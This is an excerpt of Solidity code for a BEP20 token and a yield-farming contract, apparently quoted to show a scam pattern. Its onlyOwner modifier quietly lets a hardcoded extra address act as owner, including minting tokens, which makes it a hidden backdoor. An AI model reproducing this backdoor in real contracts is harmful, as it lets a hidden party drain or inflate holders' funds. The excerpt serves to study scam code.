...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || 0x0f52e81f48f80AA5EffE13B197a1627f8E5Ee594 == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
...
contract Hyper is BEP20('Hyper', 'Hyper') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterBuilder).
    function mint(address _to, uint256 _amount) public onlyOwner {
...
// GenesisMining is the DexToken Manager. It is responsible for the creation and management of DexToken.
//
// Note that it's ownable and as with most smart contracts, the owner wields tremendous power.
contract GenesisMining is Ownable {
    ...
    // Deposit LP tokens to GenesisMining for DexToken allocation.
    ...
    // Withdraw LP tokens from GenesisMining.
    ...
    // Stake DexToken tokens to GenesisMining
    ...
    // Withdraw DexToken tokens from GenesisMining.
    ...
    function dev(address _devaddr) public {
        require(msg.sender == devaddr, "Only the Dev can do that");
        devaddr = _devaddr;
    }
